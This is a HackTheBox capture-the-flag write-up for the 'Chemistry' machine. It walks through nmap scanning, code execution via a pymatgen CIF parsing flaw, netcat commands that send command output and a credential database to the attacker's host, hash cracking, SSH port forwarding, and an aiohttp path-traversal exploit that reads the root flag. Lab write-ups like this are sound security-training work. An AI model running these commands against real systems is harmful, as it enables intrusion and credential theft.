This is a writeup for recently expired chemistry machine in Hackthebox platform.

### Part 1: Finding Foothold

l started scanning with nmap:

```
# Nmap 7.94SVN scan initiated Fri Oct 25 05:33:29 2024 as: nmap -sC -sV -p- -T4 -oN chemistry_nmap.txt 10.10.11.38
Warning: 10.10.11.38 giving up on port because retransmission cap hit (6).
Nmap scan report for 10.10.11.38
Host is up (0.32s latency).
Not shown: 65141 closed tcp ports (conn-refused), 392 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 b6:fc:20:ae:9d:1d:45:1d:0b:ce:d9:d0:20:f2:6f:dc (RSA)
|   256 f1:ae:1c:3e:1d:ea:55:44:6c:2f:f2:56:8d:62:3c:2b (ECDSA)
|_  256 94:42:1b:78:f2:51:87:07:3e:97:26:c9:a2:5c:0a:26 (ED25519)
5000/tcp open  upnp?
| fingerprint-strings:
|   GetRequest:
|     HTTP/1.1 200 OK
|     Server: Werkzeug/3.0.3 Python/3.9.5
|     Date: Fri, 25 Oct 2024 00:16:14 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 719
|     Vary: Cookie
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="UTF-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <title>Chemistry - Home</title>
|     <link rel="stylesheet" href="/static/styles.css">
|     </head>
|     <body>
|     <div class="container">
|     class="title">Chemistry CIF Analyzer</h1>
|     <p>Welcome to the Chemistry CIF Analyzer. This tool allows you to upload a CIF (Crystallographic Information File) and analyze the structural data contained within.</p>
|     <div class="buttons">
|     <center><a href="/login" class="btn">Login</a>
|     href="/register" class="btn">Register</a></center>
|     </div>
|     </div>
|     </body>
|   RTSPRequest:
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
|     "http://www.w3.org/TR/html4/strict.dtd">
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request version ('RTSP/1.0').</p>
|     <p>Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>

```

I can see website hosted on port 5000 , opening the site provide us with login form and after registering it redirects us to `/dashboard` where we can upload '.cif' file.

i checked for vulnerability in login and register section but i couldn't find anything, so as there as file upload functionality i begin to attack it.
quickly researching 'cif exploit' leads me to:
[POC Writeup](https://github.com/materialsproject/pymatgen/security/advisories/GHSA-vgv8-5cpj-qj2f)

I can execute arbitrary code using this exploit.I modified POC slightly to check if it works or not:

![NMAP](/static/writeups/chemistry/6.png)

changed "touch pwned" to "nc your-ip your-port"
and open netcat listener and upload it via upload functionality.

Attack succeds, getting reverse shell is difficult so,now lets keep changing POC slightly each time to execute different command according to our needs.

executing `("os").system ("ls -la | nc your-ip your-port")` shows different directory and files in `/home/app` directory.

going through each file i found database.db file in /home/app/instance directory which seems interesting. i downloaded it using nc and reading it using string: `string database.db`, i can see hashes and username of different user.

when i was executing above exploit i notice username `rosa` in `/home` directory which is also present in database.db.

i ran hashid to identify hash and hashcat to crack it.

![NMAP](/static/writeups/chemistry/1.png)

so, now with password and username, i successfully ssh into machine and got user flag
:

![NMAP](/static/writeups/chemistry/2.png)

### Part 2: Root Flag

We already got user and user flag. now, to get root flag I looked for open ports using:
ss -tunlp

![NMAP](/static/writeups/chemistry/3.png)

I found out another website was running locally in port 8080.
so, i forwarded port using ssh:

```
ssh -L myport:boxip:boxport user@boxip
```

I found out new website:

![NMAP](/static/writeups/chemistry/4.png)

![NMAP](/static/writeups/chemistry/5.png)

which was using aiohttp version 3.9.1, quick research shows me it is vulnerable to local file inclusion. [Github Link](https://github.com/z3rObyte/CVE-2024-23334-PoC)
so i looked at webpage source page and found `/assets` directory and made my exploit according to it (You can do it manually too):

![NMAP](/static/writeups/chemistry/7.png)

by running it i found root flag.

cheers!!
